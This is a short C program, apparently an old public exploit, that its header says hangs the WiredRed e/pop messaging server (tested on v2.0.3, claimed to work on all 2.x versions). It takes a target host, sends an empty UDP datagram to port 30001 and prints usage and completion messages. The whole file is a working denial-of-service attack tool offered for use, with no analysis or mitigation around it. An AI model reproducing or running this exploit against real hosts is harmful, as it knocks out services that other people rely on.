/*
This exploit hangs the WiredRed e/pop. Tested on v2.0.3, probably
works on all 2.x versions.
Author: cult / simas@kalnieciai.lt
*/

#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>

main(int argc, char *argv[])
{
	int sock;
	struct hostent *hp;
	struct sockaddr_in name;
	int p = 0x7531;

	if (! argv[1]) {
          printf ("WiredRed e/pop 2.x exploit by cult <simas@kalnieciai.lt>.\n");
	  printf ("Use: ./epop <ip>\n");
	  exit(1);
	};	
	sock = socket(AF_INET,SOCK_DGRAM,0);
	if (sock < 0) {
	  printf("error..\n");
	  exit(1);
	}
	hp = gethostbyname(argv[1]);
	bcopy(hp->h_addr, &name.sin_addr, hp->h_length);
	name.sin_family = AF_INET;
	name.sin_port = htons(p);
	sendto(sock,0,0,0,(const struct sockaddr *) &name, sizeof(name));
        printf ("done.\n");
	close(sock);
}

